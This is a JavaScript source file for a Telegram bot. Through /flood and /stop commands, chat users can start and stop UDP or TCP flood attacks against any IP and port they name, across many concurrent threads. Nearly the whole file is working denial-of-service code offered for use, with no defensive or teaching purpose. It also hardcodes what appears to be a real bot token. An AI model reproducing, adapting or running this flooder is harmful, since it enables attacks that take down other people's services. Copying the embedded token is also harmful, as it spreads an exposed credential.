const TelegramBot = require('node-telegram-bot-api');
const dgram = require('dgram');
const net = require('net');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with the token you get from BotFather
const token = '6725616382:AAFThqEKrBdWBNvomNBucwvoH2GmSC2Zx90';
const bot = new TelegramBot(token, { polling: true });

let floodInstances = {};

const runUDP = (chatId, ip, port, times) => {
  const data = Buffer.alloc(1024, 'X');
  const client = dgram.createSocket('udp4');
  let packets = 0;
  let floodActive = true;

  const sendPacket = () => {
    if (!floodActive) return;
    packets++;
    client.send(data, 0, data.length, port, ip, (err) => {
      if (err) {
        console.error(`Error: ${err.message}`);
        client.close();
        return;
      }
      sendPacket();
    });
  };

  sendPacket();

  const updateInterval = setInterval(() => {
    if (!floodActive) {
      clearInterval(updateInterval);
    } else {
      bot.sendMessage(chatId, `Packets sent: ${packets}`);
    }
  }, 1000);

  floodInstances[chatId] = () => {
    floodActive = false;
    client.close();
    bot.sendMessage(chatId, `UDP Flood stopped. Total packets sent: ${packets}`);
  };
};

const runTCP = (chatId, ip, port, times) => {
  const data = Buffer.alloc(16, 'X');
  let packets = 0;
  let floodActive = true;

  const sendPacket = (client) => {
    if (!floodActive) return;
    packets++;
    for (let x = 0; x < times; x++) {
      client.write(data);
    }
    setTimeout(() => sendPacket(client), 0);
  };

  const client = new net.Socket();

  client.connect(port, ip, () => {
    sendPacket(client);
  });

  client.on('error', () => {
    console.error("[*] Error");
    client.destroy();
  });

  const updateInterval = setInterval(() => {
    if (!floodActive) {
      clearInterval(updateInterval);
    } else {
      bot.sendMessage(chatId, `Packets sent: ${packets}`);
    }
  }, 1000);

  floodInstances[chatId] = () => {
    floodActive = false;
    client.destroy();
    bot.sendMessage(chatId, `TCP Flood stopped. Total packets sent: ${packets}`);
  };
};

// Handler for the /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Welcome to the UDP/TCP Flood Bot. Send /flood <IP> <port> <udp/tcp> <packets per connection> <threads> to start the flood. Use /stop to end the flood.');
});

// Handler for the /flood command with parameters
bot.onText(/\/flood (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1];
  const port = parseInt(match[2]);
  const choice = match[3].toLowerCase() === 'udp';
  const times = parseInt(match[4]);
  const threads = parseInt(match[5]);

  if (!ip || isNaN(port) || port <= 0 || port > 65535 || isNaN(times) || isNaN(threads)) {
    bot.sendMessage(chatId, 'Invalid parameters. Usage: /flood <IP> <port> <udp/tcp> <packets per connection> <threads>');
    return;
  }

  bot.sendMessage(chatId, `Starting ${choice ? 'UDP' : 'TCP'} flood on ${ip} on port ${port}. Use /stop to end the flood.`);

  for (let y = 0; y < threads; y++) {
    if (choice) {
      const udpFlooder = runUDP.bind(null, chatId, ip, port, times);
      udpFlooder();
    } else {
      const tcpFlooder = runTCP.bind(null, chatId, ip, port, times);
      tcpFlooder();
    }
  }
});

// Handler for the /stop command
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (floodInstances[chatId]) {
    floodInstances[chatId]();
    delete floodInstances[chatId];
  } else {
    bot.sendMessage(chatId, 'No active flood to stop.');
  }
});
